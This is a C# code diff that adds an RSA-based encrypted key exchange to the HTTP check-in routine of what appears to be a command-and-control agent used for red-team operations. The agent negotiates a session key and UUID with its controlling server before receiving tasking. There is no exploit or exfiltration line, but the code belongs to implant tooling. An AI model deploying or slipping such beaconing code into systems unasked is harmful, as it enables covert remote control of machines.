@@ -34,6 +34,10 @@ namespace Agent.Profiles
         private int maxAttempts = 10;
         private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
         public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
+        
+        // EKE (Encrypted Key Exchange) fields
+        private bool _uuidNegotiated = false;
+        private RSAKeyPair? rsa = null;
 
         public HttpxProfile(IAgentConfig agentConfig, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
         {
@@ -146,6 +150,53 @@ namespace Agent.Profiles
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
+            // EKE Handshake - MANDATORY for Httpx profile
+            if (!_uuidNegotiated)
+            {
+                // Generate 4096-bit RSA keypair
+                rsa = new RSAKeyPair(4096);
+                
+                // Create EKE handshake message
+                EKEHandshake handshake = new EKEHandshake
+                {
+                    action = "staging_rsa",
+                    pub_key = rsa.PublicKey,
+                    session_id = rsa.SessionId
+                };
+                
+                // Send handshake
+                string handshakeJson = JsonSerializer.Serialize(handshake, EKEHandshakeJsonContext.Default.EKEHandshake);
+                string handshakeResponse = await this.Send(handshakeJson);
+                
+                if (!string.IsNullOrEmpty(handshakeResponse))
+                {
+                    EKEHandshakeResponse ekeResp = JsonSerializer.Deserialize(handshakeResponse, EKEHandshakeResponseJsonContext.Default.EKEHandshakeResponse);
+                    
+                    if (ekeResp != null && !string.IsNullOrEmpty(ekeResp.session_key))
+                    {
+                        // Decrypt the session key using our RSA private key
+                        byte[] encryptedKey = Convert.FromBase64String(ekeResp.session_key);
+                        byte[] sessionKey = rsa.RSA.Decrypt(encryptedKey, true);
+                        
+                        // Update crypto manager with new session key and UUID
+                        this.crypt.UpdateKey(Convert.ToBase64String(sessionKey));
+                        this.crypt.UpdateUUID(ekeResp.uuid);
+                        this.agentConfig.uuid = ekeResp.uuid;
+                        
+                        _uuidNegotiated = true;
+                    }
+                    else
+                    {
+                        return new CheckinResponse() { status = "failed" };
+                    }
+                }
+                else
+                {
+                    return new CheckinResponse() { status = "failed" };
+                }
+            }
+            
+            // Now send actual checkin
             int maxAttempts = 3;
             int currentAttempt = 0;
             do
